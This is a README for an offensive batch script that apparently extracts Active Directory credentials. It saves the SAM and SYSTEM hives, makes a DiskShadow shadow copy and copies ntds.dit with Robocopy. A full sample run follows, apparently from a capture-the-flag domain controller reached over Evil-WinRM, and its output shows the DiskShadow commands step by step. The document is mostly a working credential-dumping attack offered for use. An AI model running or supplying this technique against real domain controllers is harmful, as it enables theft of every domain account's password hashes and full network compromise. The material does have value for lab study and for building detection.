README file I guess
=======================================

It uses robocopy to exploit registry keys and robocopy while also iterating through drive letters with DiskShadow to expose a shadow copy of the NTDS directory for extraction.


Description:
-------------
- Deletes any existing NTDS, SAM, SYSTEM, and ntds.dit files in the current directory. 
- Saves the SAM and SYSTEM registry hives.
- Verifies that the C:\Windows\ntds directory exists.
- Iterates through drive letters from Z to A (skipping those in use) to find an available drive.
- Creates a DiskShadow script for you
- Runs DiskShadow and checks if the shadow copy is available.
- Uses Robocopy to copy the ntds.dit file from the exposed shadow copy, then renames it to NTDS.
- Cleans up temporary files (like shadow.dsh and diskshadow output logs) after execution.




USAGE:
======================================

Literally just run it LOL

```./script.bat```

example of it running:

```BAT
*Evil-WinRM* PS C:\Users\Administrator\Documents> .\script.bat
[*] Existing NTDS file found. Deleting it... <---------- Deleting previous reg keys
[*] Existing SAM file found. Deleting it...
[*] Existing SYSTEM file found. Deleting it...

[*] Saving registry hives...
The operation completed successfully.

The operation completed successfully.

[+] Registry hives saved successfully. <---------- Was able to download the SAM & SYSTEM hives

[*] NTDS directory detected.

[-] Drive letter Z is already in use. Skipping. <---------- Example of it finding drive letters in use
[-] Drive letter Y is already in use. Skipping. <---------- Example of it finding drive letters in use
[-] Drive letter X is already in use. Skipping. <---------- Example of it finding drive letters in use
[*] Attempting DiskShadow with drive letter W...
[+] DiskShadow script created with drive letter W.

[*] DiskShadow output for drive W: <---------- DiskShadow Output
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  14/02/2025 14:32:44

-> set context persistent nowriters
-> set metadata C:\Windows\Temp\file.cab
The existing file will be overwritten.
-> add volume C: alias mydrive
-> create
Alias mydrive for shadow ID {3b141c69-e0e4-427c-9086-11c0061017be} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {00eabb91-7f00-4036-beb0-e21d792a95ab} set as environment variable.

Querying all shadow copies with the shadow copy set ID {00eabb91-7f00-4036-beb0-e21d792a95ab}

        * Shadow copy ID = {3b141c69-e0e4-427c-9086-11c0061017be}               %mydrive%
                - Shadow copy set: {00eabb91-7f00-4036-beb0-e21d792a95ab}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 2/14/2025 2:32:44 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %mydrive% W:
-> %mydrive% = {3b141c69-e0e4-427c-9086-11c0061017be}
The shadow copy was successfully exposed as W:\.
->

[+] Shadow copy successfully created on drive W:  <---------- Shadowcopy being successful
[*] Copying ntds.dit using Robocopy... 

 Log File : C:\Users\Administrator\Documents\robocopy.log <---------- logs incase you need it
[+] Robocopy operation completed. Check robocopy.log for details.

[*] Renaming ntds.dit to NTDS...
[+] File successfully renamed to NTDS.

[*] Operation completed successfully.
Press any key to continue . . .

```


